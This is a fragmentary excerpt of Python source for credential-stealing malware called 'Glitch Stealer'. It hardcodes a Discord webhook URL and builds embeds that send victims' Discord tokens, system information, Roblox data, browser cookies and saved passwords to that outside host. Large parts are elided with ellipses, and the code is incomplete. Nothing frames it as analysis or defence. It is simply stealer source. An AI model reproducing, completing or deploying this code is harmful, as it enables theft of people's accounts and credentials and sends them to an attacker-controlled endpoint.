...
hook = "https://discord.com/api/webhooks/1203695944693055619/hPZOR6Y6TFEFHQbZisoDUUsYzz_y6FKdvIM46lvsTOzofa87eOomdiQ4B_8rSBZiEg05"
...
def UP104D70K3N(token, path):
    ...
    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/1202638798039814228/1203640341576683570/glitch.jpg?ex=65d1d46b&is=65bf5f6b&hm=01b97d029e780c79b7fc07f7434a1bac85692a3dc70cd774a61c45d3299cb445&"
    else:
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": "Glitch Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1202638798039814228/1203640341576683570/glitch.jpg?ex=65d1d46b&is=65bf5f6b&hm=01b97d029e780c79b7fc07f7434a1bac85692a3dc70cd774a61c45d3299cb445&"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://cdn.discordapp.com/attachments/1202638798039814228/1203640341576683570/glitch.jpg?ex=65d1d46b&is=65bf5f6b&hm=01b97d029e780c79b7fc07f7434a1bac85692a3dc70cd774a61c45d3299cb445&",
        "username": "Glitch Stealer",
        "attachments": []
        }
...
class PcInfo:
    ...
    data = {
            ...
            "embeds": [
                {
                    "title": "Glitch Stealer | System Information",
...
data = {
            ...
            "embeds": [
                {
                    "title": "Glitch Stealer | Roblox Information",
...
def UP104D(name, link):
    ...
    if name == "lxcook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "Glitch Stealer | Cookies",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [GLHCookies.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "Glitch Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1202638798039814228/1203640341576683570/glitch.jpg?ex=65d1d46b&is=65bf5f6b&hm=01b97d029e780c79b7fc07f7434a1bac85692a3dc70cd774a61c45d3299cb445&"
    ...
    if name == "lxpassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "Glitch Stealer | Passwords",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • GLTPasswords.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "Glitch Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1202638798039814228/1203640341576683570/glitch.jpg?ex=65d1d46b&is=65bf5f6b&hm=01b97d029e780c79b7fc07f7434a1bac85692a3dc70cd774a61c45d3299cb445&"
